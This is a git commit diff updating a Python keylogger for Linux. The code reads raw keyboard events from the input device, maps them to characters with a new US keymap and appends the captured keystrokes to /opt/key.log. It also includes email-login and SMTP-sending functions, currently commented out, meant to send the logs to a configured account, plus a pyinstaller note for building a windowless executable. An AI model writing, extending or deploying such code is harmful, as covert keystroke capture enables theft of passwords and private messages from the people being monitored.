53ebdfc389113fc782878b644422840ec26bcf6f
asian-code <52612730+asian-code@users.noreply.github.com>
2019-11-21 10:21:23 -0500

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -6,24 +6,31 @@ import struct
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import smtplib
+
 '''
 pyinstaller -F -w main.py 
 '''
-#   NEED TO MAKE MY OWN KEYMAP for us keyboard
-qwerty_map = {
-    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
-    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
-    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
-    27: "$", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
-    35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
-    43: "<", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
-    51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
-}
 
+US_Keymap = {
+    1: "[ESC]", 59: "[f1]", 60: "[f2]", 61: "[f3]", 62: "[f4]", 63: "[f5]", 64: "[f6]",
+    65: "[f7]", 66: "[f8]", 67: "[f9]", 68: "[f10]", 87: "[f11]", 88: "[f12]", 111: "[Del]",
+    41: "`", 15: "[Tab]", 58: "[Capslock]", 42: "[Shift(left)]",
+    29: "[Crtl(left)]", 56: "[Alt(left)]", 55: "[Fn(left)]", 125: "[WinKey]",
+    57: " ", 14: "[Backspace]", 43: "\\", 27: "]",
+    26: "[", 39: ";", 40: "'", 28: "\n", 54: "[Shift(right)]", 53: "/", 52: ".", 51: ",",
+    100: "[Alt(right)]", 106: "[RightArrow]", 105: "[LeftArrow]", 103: "[UpArrow]", 108: "[DownArrow]",
+    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
+    11: "0", 30: "a", 48: "b", 46: "c", 32: "d", 18: "e", 33: "f", 34: "g", 35: "h", 23: "i", 36: "j", 37: "k", 38: "l",
+    50: "m", 49: "n", 24: "o", 25: "p", 16: "q", 19: "r", 31: "s", 20: "t", 22: "u", 47: "v", 17: "w", 45: "x", 21: "y",
+    44: "z",12:"-",13:"="
+
+}
+# you can change how often it writes to file
 BUF_SIZE = 100
+username=""# enter your email
+password=""# enter your password
 
 def main():
-    
     with open("/proc/bus/input/devices") as f:
         lines = f.readlines()
 
@@ -44,7 +51,8 @@ def main():
 
     event = in_file.read(EVENT_SIZE)
     typed = ""
-    #loggin in to email
+
+    # loggin in to email
     # try:
     #     login_to_email(username,password)
     # except:
@@ -54,29 +62,36 @@ def main():
         (_, _, type, code, value) = struct.unpack(FORMAT, event)
 
         if code != 0 and type == 1 and value == 1:
-            if code in qwerty_map:
-                typed += qwerty_map[code]
+            # print("[" + str(code) + "]")
+            if code in US_Keymap:
+                typed += US_Keymap[code]
         if len(typed) > BUF_SIZE:
+            #Send email
             # try:
             #     sendEmail(username,"Server Log",typed)
             # except:
             #     print("cannot send")
-            file=open("/opt/key.log","a+")
+
+            #write to file
+            file = open("/opt/key.log", "a+")
             file.write(typed)
             file.close()
+
             typed = ""
         event = in_file.read(EVENT_SIZE)
+    #Send final email
     # try:
     #     sendEmail("username,"Final",typed)
     # except:
     #     print("cannot send final")
     # server.quit()
+
+    #write final text
+    file = open("/opt/key.log", "a+")
+    file.write(typed)
+    file.close()
+
     in_file.close()
-
-
-def usage():
-    print(
-        "Usage : ./keylogger [buffer_size]")
 
 
 def login_to_email(username, password):
@@ -125,14 +140,4 @@ def authenticate():
         return False
 
 
-def init_arg():
-    if len(sys.argv) < 1:
-        usage()
-        exit()
-    global BUF_SIZE
-    BUF_SIZE = int(sys.argv[1])
-
-
-
-# init_arg()
 main()
